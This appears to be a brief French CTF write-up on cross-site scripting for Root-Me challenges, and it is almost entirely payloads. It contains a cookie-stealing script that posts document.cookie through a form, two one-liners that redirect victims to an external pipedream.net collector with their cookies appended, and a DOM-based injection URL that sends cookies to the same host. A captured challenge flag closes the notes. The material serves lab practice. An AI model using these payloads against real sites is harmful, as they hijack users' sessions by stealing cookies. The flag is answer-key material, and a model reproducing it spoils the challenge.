# XSS

## Exploitation
----------------

<script>
        if (window.location.href[window.location.href.length - 1] == "P") {
            const urlParams = new URLSearchParams(window.location.search);
            urlParams.forEach((value, key) => {
                localStorage.setItem(key, value);
            });
            document.getElementsByName("titre")[0].value = "Racked";
            document.getElementsByName("message")[0].value = document.cookie;
            document.getElementsByTagName("Form")[0].submit();
        } else {
            let l = document.querySelectorAll('body > div > span');
            if (l[l.length - 1].innerText != "Racked") {
                window.location.replace(window.location.href + "?data=" + document.cookie + "P");
            }
        }
</script>

>window.location.href ="https://eodc8nsrzvgs12t.m.pipedream.net?data=" + document.cookie

>document.location ="https://eodc8nsrzvgs12t.m.pipedream.net?data=" + document.cookie

## XSS DOM BASED

On remarque que la variable number récupère les données via l'url
On a simplement à fermer les guillements pour ensuite executer le code
`http://challenge01.root-me.org/web-client/ch32/index.php?number=%27;document.location.href=%22https://eodc8nsrzvgs12t.m.pipedream.net?data=%22.concat(document.cookie);`

### FLAG
`rootme{XSS_D0M_BaSed_InTr0}`
